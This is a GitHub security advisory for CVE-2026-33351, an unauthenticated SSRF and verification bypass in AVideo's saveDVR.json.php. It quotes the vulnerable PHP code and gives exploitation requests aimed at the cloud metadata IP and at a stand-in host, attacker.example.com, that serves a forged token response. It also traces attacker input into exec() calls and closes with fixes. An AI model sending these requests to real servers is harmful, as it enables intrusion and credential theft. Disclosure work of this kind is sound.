# [C] AVideo has Unauthenticated SSRF via `webSiteRootURL` Parameter in saveDVR.json.php, Chaining to Verification Bypass

## Summary
Severity: Critical
Advisory: GHSA-5f7v-4f6g-74rj
CVE: CVE-2026-33351
CWE: CWE-918
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-03-19
Source: https://github.com/advisories/GHSA-5f7v-4f6g-74rj
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0

## Details
### Summary

A Server-Side Request Forgery (SSRF) vulnerability exists in `plugin/Live/standAloneFiles/saveDVR.json.php`. When the AVideo Live plugin is deployed in standalone mode (the intended configuration for this file), the `$_REQUEST['webSiteRootURL']` parameter is used directly to construct a URL that is fetched server-side via `file_get_contents()`. No authentication, origin validation, or URL allowlisting is performed.

### Affected Component

**File:** `plugin/Live/standAloneFiles/saveDVR.json.php`, lines 5-28

```php
$streamerURL = ""; // change it to your streamer URL

$configFile = '../../../videos/configuration.php';
if (file_exists($configFile)) {
    include_once $configFile;
    $streamerURL = $global['webSiteRootURL'];
}

if (empty($streamerURL) && !empty($_REQUEST['webSiteRootURL'])) {
    $streamerURL = $_REQUEST['webSiteRootURL'];   // ATTACKER-CONTROLLED
}

// ...

$verifyURL = "{$streamerURL}plugin/SendRecordedToEncoder/verifyDVRTokenVerification.json.php?saveDVR={$_REQUEST['saveDVR']}";
$result = file_get_contents($verifyURL);           // SSRF
```

### Root Cause

1. **User-controlled URL base:** When the configuration file does not exist (standalone deployment), `$streamerURL` is set directly from `$_REQUEST['webSiteRootURL']` with no validation.
2. **No URL allowlisting or scheme restriction:** The value is used as-is in a `file_get_contents()` call. There is no check for `http`/`https` scheme only, no private IP blocking, and no domain allowlist.
3. **Verification bypass by design:** The token verification URL is constructed using the attacker-controlled base URL. The attacker can point it to their own server, which returns a JSON response that passes all validation checks, effectively bypassing authentication.

### Exploitation

#### Part 1: Basic SSRF (Internal Network Access)

```
POST /plugin/Live/standAloneFiles/saveDVR.json.php
Content-Type: application/x-www-form-urlencoded

webSiteRootURL=http://169.254.169.254/latest/meta-data/iam/security-credentials/&saveDVR=anything
```

The server fetches:
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/plugin/SendRecordedToEncoder/verifyDVRTokenVerification.json.php?saveDVR=anything
```

While the appended path may cause a 404 on the metadata service, the attacker can also use this for:
- **Internal port scanning:** `webSiteRootURL=http://192.168.1.X:PORT/` — differentiate open/closed ports by response time and error messages.
- **Internal service access:** `webSiteRootURL=http://internal-service/` — reach services behind the firewall.
- **Cloud metadata access:** With URL path manipulation or by hosting a redirect on the attacker server.

#### Part 2: Verification Bypass + Downstream Command Execution Chain

This is the more severe attack chain:

1. The attacker sets up a server at `https://attacker.example.com/` with the path:
   ```
   /plugin/SendRecordedToEncoder/verifyDVRTokenVerification.json.php
   ```
   That returns:
   ```json
   {"error": false, "response": {"key": "attacker_controlled_value"}}
   ```

2. The attacker sends:
   ```
   POST /plugin/Live/standAloneFiles/saveDVR.json.php

   webSiteRootURL=https://attacker.example.com/&saveDVR=anything
   ```

3. The server fetches the verification URL from the attacker's server, receives the forged valid response, and proceeds to process it.

4. The `key` value from the response flows into shell commands:
   - **Line 55:** `$DVRFile = "{$hls_path}{$key}";` — used in `exec()` at line 80 (though `escapeshellarg()` is applied to the path components)
   - **Line 72:** `$DVRFileTarget = "{$tmpDVRDir}" . DIRECTORY_SEPARATOR . "{$key}.m3u8";` — used **without** `escapeshellarg()` in:
     - Line 119: `exec("echo \"{$endLine}\" >> {$DVRFileTarget}");`
     - Line 157: `exec("ffmpeg -i {$DVRFileTarget} -c copy -bsf:a aac_adtstoasc {$filename} -y");`
     - Line 167: `exec("rm -R {$tmpDVRDir}");`

   The `$key` is sanitized at line 47 with `preg_replace("/[^0-9a-z_:-]/i", "", $key)`, which limits characters to alphanumerics, underscores, colons, and hyphens. This blocks most command injection payloads. However:
   - The SSRF itself (Part 1) is independently exploitable regardless of the downstream chain.
   - The verification bypass grants the attacker control over the processing flow even if direct OS command injection is constrained by the regex.
   - The colon character (`:`) is allowed by the regex and has special meaning in some shell contexts and FFmpeg input specifiers.

### Impact

- **SSRF:** The server can be used as a proxy to scan and access internal network resources, cloud metadata endpoints, and other services not intended to be publicly accessible.
- **Authentication Bypass:** The DVR token verification is completely bypassed by redirecting the check to an attacker-controlled server.
- **Potential Command Execution:** While the regex on `$key` limits direct shell injection, the attacker gains control over file paths and FFmpeg input specifiers, which could be leveraged for further exploitation depending on the environment.
- **Information Disclosure:** Error messages at lines 31-32 reflect the fetched URL and its content, potentially leaking information about internal infrastructure.

### Suggested Fix

1. **Remove the user-controlled `webSiteRootURL` fallback entirely.** Require `$streamerURL` to be configured in the file or via the configuration file. If a fallback is necessary, validate it against a strict allowlist:

   ```php
   // Remove this block:
   // if (empty($streamerURL) && !empty($_REQUEST['webSiteRootURL'])) {
   //     $streamerURL = $_REQUEST['webSiteRootURL'];
   // }

   // If $streamerURL is still empty, abort:
   if (empty($streamerURL)) {
       error_log("saveDVR: streamerURL is not configured");
       die('saveDVR: Server not configured');
   }
   ```

2. **If the parameter must remain for backward compatibility**, validate it:
   ```php
   if (empty($streamerURL) && !empty($_REQUEST['webSiteRootURL'])) {
       $url = filter_var($_REQUEST['webSiteRootURL'], FILTER_VALIDATE_URL);
       if ($url && preg_match('/^https?:\/\//i', $url)) {
           // Resolve hostname and block private/reserved IPs
           $host = parse_url($url, PHP_URL_HOST);
           $ip = gethostbyname($host);
           if (!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
               die('saveDVR: Invalid URL');
           }
           $streamerURL = $url;
       }
   }
   ```

3. **Apply `escapeshellarg()` to all variables used in `exec()` calls**, including `$DVRFileTarget` at lines 119, 157, and `$tmpDVRDir` at line 167.

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-5f7v-4f6g-74rj
- https://nvd.nist.gov/vuln/detail/CVE-2026-33351
- https://github.com/WWBN/AVideo/commit/d0c54960389eeb85e76caed5a257ae90e6a739f2
- https://github.com/WWBN/AVideo
